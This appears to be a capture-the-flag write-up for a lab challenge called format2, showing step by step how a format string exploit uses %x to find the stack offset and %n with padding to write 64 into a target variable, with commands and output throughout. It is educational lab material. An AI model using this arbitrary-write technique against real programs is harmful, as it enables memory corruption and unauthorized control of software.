<h2>Goal</h2>
The goal of this challenge, and the process to determine the solution is almost identical as the last challenege, Format1.  The difference in this challenge change the value of Target variable to a specific value.

```c
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
```

<h2>Process</h2>

First stepis to find the address for the `target` variable. 
```bash
objdump -t format2 | grep target

target = 080496e4
```

Next is to find where we can overwrite memory.

```bash
python -c 'print "AAAA"+"%x "*100' | ./format2

AAAA200 b7fd8420 bffff614 41414141 25207825 78252078...... repeating and some garbage.
```
This time we had control much sooner. This value is small so it can be easily counted, we get control at the fourth address.

```bash
python -c 'print "AAAA"+"%x "*4' | ./format2 

AAAA200 b7fd8420 bffff614 41414141
````

Now lets fit in the address of target.

```bash
 python -c 'print "\xe4\x96\x04\x08"+"%x"*4' | ./format2
 
��200b7fd8420bffff61480496e4
target is 0 :(
```
Ok, we've got everything setup. Now let's remove one of the `"%x "` and replace it with the required `"%n "`

```bash
python -c 'print "\xe4\x96\x04\x08"+"%x"*3+"%n"' | ./format2

��200b7fd8420bffff614
target is 23 :(
```

While the value of target is not 64, we have changed it to 23.  Now to increase this value we can add some padding to the format portion like so: `"%4x "` the 4 can be changed as needed to increase or decrease the outcome. For me the value of 4 incremented `target` by one to 24. So I then added ten:

```bash
python -c 'print "\xe4\x96\x04\x08"+"%10x"*3+"%n"' | ./format2

��       200  b7fd8420  bffff614
target is 34 :(
```



<h2>Solution</h2>
Next I just guessed and added another 10, making the padding 20.

```bash
python -c 'print "\xe4\x96\x04\x08"+"%20x"*3+"%n"' | ./format2

��                 200            b7fd8420            bffff614
you have modified the target :)
```

After examining the output and my padding I understood why this much padding work, its just some quick easy math.  Take 20 and 3 from `"%20x"*3` and we get 60 extra bytes of padding. Then 4 bytes for the address.

Another way to do this is.

```bash
python -c 'print "\xe4\x96\x04\x08"+"%x%x%x%n"' | ./format2

��200b7fd8420bffff614
target is 23 :(
```

From here we can replace the first `%x` with the padding `%4x`.  Some trial and error will be needed to get the exact padding again.

```bash
python -c 'print "\xe4\x96\x04\x08"+"%44x%x%x%n"' | ./format2

��                                         200b7fd8420bffff614
you have modified the target :)

```


Another way is
```bash
python -c 'print "\xe4\x96\x04\x08"+"%60c%4$n"' | ./format2
��                                                           
you have modified the target :)
```






